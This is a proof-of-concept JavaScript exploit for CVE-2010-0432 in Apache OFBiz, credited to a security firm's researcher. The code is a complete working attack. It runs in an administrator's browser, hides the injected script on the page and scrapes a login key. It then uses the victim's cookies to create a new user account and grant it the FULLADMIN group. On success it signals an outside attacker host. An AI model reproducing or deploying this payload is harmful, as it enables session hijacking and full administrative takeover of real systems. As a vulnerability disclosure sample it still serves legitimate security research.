/*
 
Apache OFBiz FULLADMIN Creator PoC Payload.
 
CVE: CVE-2010-0432
 
By: Lucas Apa ( lucas -at- bonsai-sec.com ).
 
Bonsai Information Security
 
http://www.bonsai-sec.com/
 
*/
 
var username = 'bonsaiUser';
var password = 'bonsaiPass';
 
var nodes = document.getElementsByClassName('fieldWidth300');
for (var i=0; i<nodes.length; i++) {
if(/script/.test(nodes[i].children[0].innerHTML)){
nodes[i].parentNode.style.display = "none";
}
}
var xmlhttp=false;
try {
xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
} catch (E) {
xmlhttp = false;
}
}
 
if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
try {
xmlhttp = new XMLHttpRequest();
} catch (e) {
xmlhttp=false;
}
}
if (!xmlhttp && window.createRequest) {
try {
xmlhttp = window.createRequest();
} catch (e) {
xmlhttp=false;
}
}
 
xmlhttp.open("GET", "/myportal/control/main",true);
xmlhttp.send(null)
xmlhttp.onreadystatechange=function() {
if (xmlhttp.readyState==4) {
var text = xmlhttp.responseText;
var regex = /externalLoginKey=(.*?)\"/;
var externalKey = text.match(regex)[1];
 
xmlhttp2 = false;
try {
xmlhttp2 = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
xmlhttp2 = new ActiveXObject("Microsoft.XMLHTTP");
} catch (E) {
xmlhttp2 = false;
}
}
 
if (!xmlhttp2 && typeof XMLHttpRequest!='undefined') {
try {
xmlhttp2 = new XMLHttpRequest();
} catch (e) {
xmlhttp2=false;
}
}
if (!xmlhttp && window.createRequest) {
try {
xmlhttp2 = window.createRequest();
} catch (e) {
xmlhttp2=false;
}
}
var cookie = unescape(document.cookie);
xmlhttp2.open("POST",
"/webtools/control/scheduleService?externalLoginKey="+externalKey,true);
xmlhttp2.onreadystatechange=function() {
if (xmlhttp2.readyState==4) {
//alert(xmlhttp.responseText)
}
}
xmlhttp2.setRequestHeader("cookie", cookie);
xmlhttp2.setRequestHeader("content-type",
"application/x-www-form-urlencoded");
 
var
str1=(<r><![CDATA[POOL_NAME=pool&SERVICE_NAME=createUserLogin&_RUN_SYNC_=Y&currentPassword=]]></r>).toString();
var str2 = (<r><![CDATA[&currentPasswordVerify=]]></r>).toString();
var str3 =
(<r><![CDATA[&enabled=&externalAuthId=&partyId=&passwordHint=&requirePasswordChange=&userLoginId=]]></r>).toString();
var post_data = str1 + password + str2 + password + str3 + username;
xmlhttp2.send(post_data);
 
var xmlhttp3=false;
try {
xmlhttp3 = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
xmlhttp3 = new ActiveXObject("Microsoft.XMLHTTP");
} catch (E) {
xmlhttp3 = false;
}
}
if (!xmlhttp3 && typeof XMLHttpRequest!='undefined') {
try {
xmlhttp3 = new XMLHttpRequest();
} catch (e) {
xmlhttp3=false;
}
}
if (!xmlhttp3 && window.createRequest) {
try {
xmlhttp3 = window.createRequest();
} catch (e) {
xmlhttp3=false;
}
}
 
xmlhttp3.open("POST",
"/webtools/control/UpdateGeneric?entityName=UserLoginSecurityGroup&externalLoginKey="+externalKey,true);
xmlhttp3.onreadystatechange=function() {
if (xmlhttp3.readyState==4) {
if(/UserLoginSecurityGroup/.test(xmlhttp3.responseText)){
var xmlhttp4=false;
try {
xmlhttp4 = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
xmlhttp4 = new ActiveXObject("Microsoft.XMLHTTP");
} catch (E) {
xmlhttp4 = false;
}
}
if (!xmlhttp4 && typeof XMLHttpRequest!='undefined') {
try {
xmlhttp4 = new XMLHttpRequest();
} catch (e) {
xmlhttp4=false;
}
}
if (!xmlhttp4 && window.createRequest) {
try {
xmlhttp4 = window.createRequest();
} catch (e) {
xmlhttp4=false;
}
}
xmlhttp4.open("GET", "
http://www.attacker.com/successful-ofbiz-attack.php?done=yes",true);
xmlhttp4.send(null);
}
}
}
xmlhttp3.setRequestHeader("cookie",cookie);
xmlhttp3.setRequestHeader("content-type",
"application/x-www-form-urlencoded");
 
var str1 = (<r><![CDATA[UPDATE_MODE=CREATE&userLoginId=]]></r>).toString();
var str2 =
(<r><![CDATA[&groupId=FULLADMIN&fromDate=2000-02-01+1%3A38%3A44.252&thruDate=2020-02-27+1%3A38%3A49.268&lastUpdatedStamp=2010-02-11+1%3A38%3A56.724&lastUpdatedTxStamp=2010-02-04+1%3A39%3A0.260&createdStamp=2010-02-22+1%3A39%3A2.692&createdTxStamp=2010-02-28+1%3A39%3A6.548&Update=Crear]]></r>).toString();
 
var post_data2 = str1 + username + str2;
 
xmlhttp3.send(post_data2);
 
}
}